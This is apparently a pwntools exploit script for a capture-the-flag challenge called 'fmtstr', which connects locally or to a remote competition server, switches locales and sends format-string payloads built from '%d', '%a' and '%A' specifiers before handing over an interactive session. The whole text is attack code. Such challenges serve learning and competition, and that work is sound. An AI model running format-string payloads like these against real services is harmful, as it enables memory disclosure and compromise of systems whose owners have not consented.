from pwn import *

if args.LOCAL:
    io = process("./fmtstr")
    if args.GDB:
        cmd = """
        b* print_time+197
        """
        gdb.attach(io, cmd)
else:
    io = remote("challs.nusgreyhats.org", 31234)


io.sendline(b'2')
io.sendline(b'ga_IE.utf8\0')
pause()
io.sendline(b'1')
io.sendline(b"%d"+b"%a"*8)



io.sendline(b'2')
io.sendline(b'lt_LT.UTF-8\0')
pause()
io.sendline(b'1')
io.sendline(b"%d"*2+b"%a"+b"%A"*2)


io.interactive()